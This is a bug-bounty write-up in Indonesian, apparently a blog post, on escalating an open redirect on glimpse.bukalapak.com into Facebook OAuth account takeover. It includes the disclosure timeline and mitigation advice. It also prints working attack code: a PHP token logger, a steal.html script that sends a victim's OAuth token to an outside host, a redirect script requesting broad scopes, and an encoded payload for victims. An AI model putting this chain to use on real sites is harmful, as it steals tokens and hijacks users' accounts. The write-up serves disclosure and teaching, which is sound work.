---
title: "Open redirect -> Account Takeover pada bukalapak.com"
date: 2020-07-14 01:38:00 +0000
modified: 2020-07-14
description: "Escalating Open Redirect into Account Takeover pada Bukalapak.com"
comments: true
tags:
- bukalapak
mathjax: false
category:
- Bugbounty
private: false

---
### Open Redirect  

Open Redirect adalah kerentanan dimana aplikasi menerima input dari pengguna yang akan digunakan untuk perpindahan halaman atau redirect pada aplikasi dan biasanya input tersebut tidak mempunyai filter atau dapat dibypass, input dari user yang akan di gunakan sebagai redirect tersebut yang menyebabkan penyalahgunaan fitur tersebut.

### Account Takeover 

Account Takeover adalah mengambil alih akses akun orang lain sama seperti artinya secara harviah, untuk melakukan account takeover kita dapat menggunakan berbagai macam cara, salah satunya adalah yang akan dijelaskan pada report ini yaitu menggabungkan kerentanan *Open Redirect* dengan *Facebook Oauth* untuk mendapatkan *token* dari akun orang lain, sehingga dapat mengambil alih akses terhadap akun yang dimiliki orang lain.  

###  Kesimpulan Masalah   

Open redirect yang ditemukan ada pada domain glimpse.bukalapak.com dengan parameter link, contoh open redirect nya adalah : [https://glimpse.bukalapak.com/redirect?link=https://evil.com](https://glimpse.bukalapak.com/redirect?link=https://evil.com "https://glimpse.bukalapak.com/redirect?link=https://evil.com") tapi karena bukalapak tidak menerima *Open Redirect* yang meliki impact keamanan yang kecil, maka saya harus mencari cara untuk memanfaatkan celah yang ada untuk mendapatkan celah yang mempunyai impact lebih besar dari pada sekedar *Open Redirect*.  

![Bukalapak Details](/images/bukalapak/redir.PNG)

saya mencoba memanfaatkan kelemahan tersebut(open redirect) agar bisa meningkatkan tingkat resikonya dengan *oauth* (facebook/google) dan dapat melakukan *account takeover*. 

fitur login dengan facebook yang berada di url berikut:   

    https://www.facebook.com/v3.0/dialog/oauth?client_id=727108917352926&redirect_uri
    =https%3A%2F%2Fctfs.me&response_type=token

Oauth facebook memiliki 3 parameter yang seharusnya ada pada requestnya yaitu **client_id** dimana **727108917352926** adalah ID milik aplikasi bukalapak di facebook , kemudian **redirect_uri** adalah url yang akan menerima callback dari facebook **Yang hanya bisa di arahkan kepada domain milik bukalapak yaitu \*.bukalapak.com** , karena kita sudah memiliki open redirect maka attack scenario ini dapat mudah dijalankan, jika kita menggunakan domain selain bukalapak sebagai **redirect_uri** nya maka kita akan mendapatkan error berikut :   

![Error FB Oauth](/images/bukalapak/error.PNG)

Skenario yang saya buat untuk melancarkan attack ini adalah sebagai berikut :   

![Skenario](/images/bukalapak/skenario.PNG)

saya menggunakan 3 file berikut untuk mendapatkan token dari user, tanpa adanya user interaction sama sekali hingga tokennya tersimpan di dalam log yang saya persiapkan.   

```
    //file save.php
    <?php
    $file = fopen("token_facebook_log.txt","a");
    fwrite($file,@$_GET['data']."\n");
    fclose($file);
    ?>
```    

```
    //file steal.html
    <h2> 😈😈😈</h2>
    <script>
     let token = window.location.hash.substring(1);
     //alert("YOUR TOKEN IS MINE: "+token);
     const Http = new XMLHttpRequest();
     const url='https://security.ctfs.me/save.php?data='+token;
     Http.open("GET", url);
     Http.send();
     Http.onreadystatechange=(e)=>{
     console.log(Http.responseText)
     }
    </script>
    <meta http-equiv="refresh" content="1; url=https://bukalapak.com" />
```

```
    //file trusted.php
    <?php
    header("Location:
    https://www.facebook.com/v3.0/dialog/oauth?client_id=727108917352926&redirect_uri
    =https%3A%2F%2Fglimpse.bukalapak.com%2Fredirect%3Flink%3Dhttps://security.ctfs.me
    /steal.html&response_type=token&scope=email%2C+groups_access_member_info%2C+p
    ublish_to_groups%2C+user_age_range%2C+user_birthday%2C+user_events%2C+user_fri
    ends%2C+user_gender%2C+user_hometown%2C+user_likes%2C+user_link%2C+user_loca
    tion%2C+user_photos%2C+user_posts%2C+user_tagged_places%2C+user_videos%2C+pu
    blish_actions%2C+manage_pages%2C+instagram_basic");
    ?>
```

Untuk validasi token yang kita dapatkan ke facebook bisa menggunakan [https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2](https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2 "https://developers.facebook.com/tools/debug/accesstoken/?access_token=TOKEN_HERE&version=v3.2"), dan ternyata ketika user tersebut menggunakan Mobile Apps Bukalapak token yang di grant mempunyai waktu expired **NEVER** yang berarti hanya perlu 1x mengambil token dari korban dan attacker dapat login menggunakan token tersebut kapanpun(**NEVER**).

![FB Debug](/images/bukalapak/debug.PNG)  

    // Final Payload ( untuk di-kirimkan kepada korban )
    https://glimpse.bukalapak.com/redirect?link=%68%74%74%70%73%3a%2f%2f%73%65%6
    3%75%72%69%74%79%2e%63%74%66%73%2e%6d%65%2f%74%72%75%73%74%65%64
    %2e%70%68%70

User tidak diperlukan melakukan apapun **jika sudah terauthentikasi bukalapaknya dengan facebook** (jika belum maka aplikasi bukalapak akan meminta izin ke facebook) dan kemudian token user tersebut akan dikirim kepada log attacker.


### Video POC

<iframe width="560" height="315" src="https://www.youtube.com/embed/CR3Uyw7ydhg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

### Timeline

|Description|Date|
|----------|:-------------:|
| **Sent Report to security@bukalapak.com** | Jan 17, 2019, 12:49 AM |
| **Bukalapak Response(Verify)** | Jan 17, 2019, 11:43 AM |
| **Bukalapak Response(Known Issue)** | Jan 18, 2019, 2:34 PM |
| **Publish Writeup** | Jul 14, 2020 9:00 PM |

### Saran

Untuk mitigasi celah keamanan ini bisa dengan menerapkan whitelist terhadap redirect yang ada pada glimpse.bukalapak.com atau merubah konfigurasi aplikasi facebook-nya agar hanya menerima domain tertentu saja untuk menerima callback token dari oauth, jangan menggunakan wildcard **\*.bukalapak.com** karena bukalapak yang memiliki banyak domain dan asset dibelakang domain tersebut jadi akan sulit untuk memastikan semua asset tidak memiliki kerentanan seperti *open redirect*.
